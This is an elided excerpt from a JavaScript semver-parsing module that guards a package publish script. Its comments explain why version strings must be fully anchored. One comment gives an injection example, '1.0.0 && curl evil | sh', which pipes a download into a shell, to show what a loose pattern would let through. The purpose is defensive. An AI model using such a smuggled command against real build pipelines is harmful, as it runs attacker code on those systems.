/**
 * Pure version-bump classification used by `publish.mjs`. No I/O, no
 * `process.exit` — just semver math, so the in-line publish guard can be
 * unit-tested and reused without side effects.
 */
 ...
 * garbage version can't masquerade as a fresh release and wave a
 * publish through.
 */
export function parseSemver(v) {
  ...
  // ([0-9A-Za-z.-]). A start-anchored-only pattern would let a version
  // like `1.0.0 && curl evil | sh` parse as a valid bump and carry its
  // shell metacharacters into any string-interpolated command.
 ...
 * is unparseable. Prerelease/build metadata is ignored.
 */
